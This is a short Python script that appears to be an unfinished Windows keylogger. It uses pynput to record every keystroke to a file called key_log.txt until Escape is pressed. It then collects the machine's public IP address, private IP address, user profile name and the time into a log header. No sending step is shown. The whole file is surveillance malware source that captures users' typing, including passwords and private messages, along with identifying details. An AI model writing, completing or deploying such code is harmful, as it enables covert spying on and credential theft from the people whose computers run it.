from pynput.keyboard import Key, Listener

import logging
import time
import os
import random
import requests
import socket
import win32gui

log_dir = ""
#log key strokes to txt file
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')
#function to register key press, if statement to stop script
def on_press(key):
    logging.info(str(key))
    if key == Key.esc:
        return False
#turns on listener
with Listener(on_press=on_press) as listener:
    listener.join()

publicIP = requests.get('https://api.ipify.org').text
privateIP = socket.gethostbyname(socket.gethostname())
user = os.path.expanduser('~').split('\\')[2]
datetime = time.ctime(time.time())

print(privateIP)
print(user)

msg = f'[START OF LOGS]\n *~ Date/Time: {datetime}\n *~ User-Profile: {user}\n *~ Public-IP: {publicIP}\n *~ Private-IP: {privateIP}\n\n'

logged_data = []
logged_data.append(msg)


